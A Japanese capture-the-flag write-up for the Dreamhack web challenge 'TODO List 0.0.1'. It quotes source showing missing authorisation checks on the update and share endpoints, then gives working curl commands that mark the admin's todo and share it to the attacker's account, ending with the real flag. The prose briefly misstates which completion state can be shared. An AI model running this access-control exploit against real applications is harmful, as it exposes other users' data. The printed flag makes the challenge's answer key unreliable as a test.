# TODO List 0.0.1:web:372pts

[Download challenge](45471fb1-c720-40c7-9001-c41ed0ec3b24.zip)  

Servers  
Host: host3.dreamhack.games  
Port: 9368/tcp → 8080/tcp  

# Solution
ソースと接続先が渡される。  
アクセスすると、`Login`と`Sign Up`が行え、ログインするとTodoアプリのようだ。  
![site.png](site/site.png)  
完了済みかどうかチェックボックスで管理できる。  
他に特別な機能もなさそうなので、ソースを見る。  
フラグはcreate.sqlよりadminのTodoにあるらしい。  
```sql
~~~
INSERT INTO Users (username, email, password) VALUES (
    'admin',
    'admin@dreamhack.io',
    'helloworld' -- redacted
);
INSERT INTO Todolist (user_id, name) VALUES (
    1,
    'admin'
);

INSERT INTO Todo (todo_list_id, title, description, is_completed) VALUES (
    1,
    'flag',
    'DH{sample_flag}',
    1
);
~~~
```
パスワードが不明なのでadminとしてログインはできないため、別の方法でTodoを盗む必要がある。  
各機能を調査していく。  

**server/api/todolist.js**  
```js
import { verifyToken } from '../utils/auth';
import { openDatabase } from '../utils/db';

export default defineEventHandler(async (event) => {
    try {
        const userData = verifyToken(event.req);
        const db = await openDatabase();
        const todoList = await db.all('SELECT * FROM Todo where todo_list_id=(SELECT id FROM Todolist WHERE Todolist.user_id = ?)', [userData.userId]);

        const sharedList = await db.all('SELECT * FROM TodoShares where user_id= ? ', [userData.userId]);
        for (const shared of sharedList){
            if (shared.permission_type === "owner" || shared.permission_type === "shared")
            todoList.push(await db.get('SELECT * FROM Todo where id = ?',[shared.todo_id]));
        };
        return todoList;
    } catch (error) {
        return createError({
            statusCode: 401,
            statusMessage: 'Unauthorized: ' + error.message
        });
    }
});
```
自身の`user_id`に紐づいているTodoを表示する機能だ。  
怪しい共有機能があるようで、自身に共有されているTodoも表示されている。  

**server/api/shareTodo.js**  
```js
import { readBody, createError } from 'h3';
import { openDatabase } from '../utils/db';

export default defineEventHandler(async (event) => {
    const userData = verifyToken(event.req);
    const db = await openDatabase();
    const body = await readBody(event);
    
    const todo = body;
    try {
        const todo_data = await db.get(
            'SELECT * FROM Todo WHERE id = ?', [todo.id]
        );
        if (todo_data.is_completed === 1) {
            return { message: 'you cannot share already completed todo', id: todo_data.id}
        }

        const result = await db.run(
            `INSERT INTO TodoShares (todo_id, user_id, permission_type) VALUES
            (?, ?, ?)`,
            [todo_data.id, todo.target_id, 'shared']
          );
        return { success: true, message: 'Todo shared successfully', id: result.lastID };
    } catch (error) {
        throw createError({ statusCode: 500, statusMessage: 'Database error: ' + error.message });
    }
});
```
`id`と`target_id`を受け取って、完了したTodoの`id`であれば`target_id`のユーザへ共有する機能だ。  
特別な権限管理はないので、adminのTodoを自身に共有することで盗めそうだ。  
ただし問題点として、adminのTodoは完了状態でないので共有できない。  

**server/api/updateTodo.js**  
```js
import { readBody, createError } from 'h3';
import { openDatabase } from '../utils/db';

export default defineEventHandler(async (event) => {
    const userData = verifyToken(event.req);
    const db = await openDatabase();
    const body = await readBody(event);
    
    const { id, value} = body;
    try {
        const result = await db.run(
            `UPDATE todo
             SET is_completed = ?
             WHERE id = ?`,
            [value, id]
          );
        return { success: true, message: 'Todo updated successfully', id: result.lastID };
    } catch (error) {
        throw createError({ statusCode: 500, statusMessage: 'Database error: ' + error.message });
    }
});
```
Todoの完了状態を更新できる機能だ。  
こちらにも特別な権限管理はないので、adminのTodoを勝手に完了状態にすることができる。  

ここまでの機能を組み合わせて以下のようにadminのTodoを盗むことができるとわかる。  

- /updateTodoでadminのTodoを完了状態にする。  
- /shareTodoでadminのTodoを自身に共有する。  
- /todolistで共有されたTodoを表示し、フラグを取得する。  

以下のように行う。  
```bash
$ curl -X POST 'http://host3.dreamhack.games:9368/api/signup' -H 'Content-Type: application/json' -d '{"username": "satoki", "email":"satoki@example.com", "password":"satoki00"}'
{
  "message": "User registered successfully.",
  "userId": 2
}
$ curl -X POST 'http://host3.dreamhack.games:9368/api/login' -H 'Content-Type: application/json' -d '{"email":"satoki@example.com", "password":"satoki00"}'
{
  "message": "Login successful!",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsImVtYWlsIjoic2F0b2tpQGV4YW1wbGUuY29tIiwiaWF0IjoxNzI3NTAxNTI2LCJleHAiOjE3Mjc1MTIzMjZ9.KovD7kIO1RbC6oQvEYXisptwsHsFPJJ-wJ3thHYdDfU"
}
$ curl -X POST 'http://host3.dreamhack.games:9368/api/updateTodo' -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsImVtYWlsIjoic2F0b2tpQGV4YW1wbGUuY29tIiwiaWF0IjoxNzI3NTAxNTI2LCJleHAiOjE3Mjc1MTIzMjZ9.KovD7kIO1RbC6oQvEYXisptwsHsFPJJ-wJ3thHYdDfU' -d '{"id":1, "value":false}'
{
  "success": true,
  "message": "Todo updated successfully",
  "id": 0
}
$ curl -X POST 'http://host3.dreamhack.games:9368/api/shareTodo' -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsImVtYWlsIjoic2F0b2tpQGV4YW1wbGUuY29tIiwiaWF0IjoxNzI3NTAxNTI2LCJleHAiOjE3Mjc1MTIzMjZ9.KovD7kIO1RbC6oQvEYXisptwsHsFPJJ-wJ3thHYdDfU' -d '{"id":1, "target_id":2}'
{
  "success": true,
  "message": "Todo shared successfully",
  "id": 1
}
$ curl 'http://host3.dreamhack.games:9368/api/todolist' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsImVtYWlsIjoic2F0b2tpQGV4YW1wbGUuY29tIiwiaWF0IjoxNzI3NTAxNTI2LCJleHAiOjE3Mjc1MTIzMjZ9.KovD7kIO1RbC6oQvEYXisptwsHsFPJJ-wJ3thHYdDfU'
[
  {
    "id": 1,
    "todo_list_id": 1,
    "title": "flag",
    "description": "DH{3447b6a1637d4f3d48b877b8338f44ab8d5dd8f0a3e17a7fea5ec9f147305f96}",
    "is_completed": 0,
    "start_date": null,
    "due_date": null
  }
]
```
flagが得られた。  

## DH{3447b6a1637d4f3d48b877b8338f44ab8d5dd8f0a3e17a7fea5ec9f147305f96}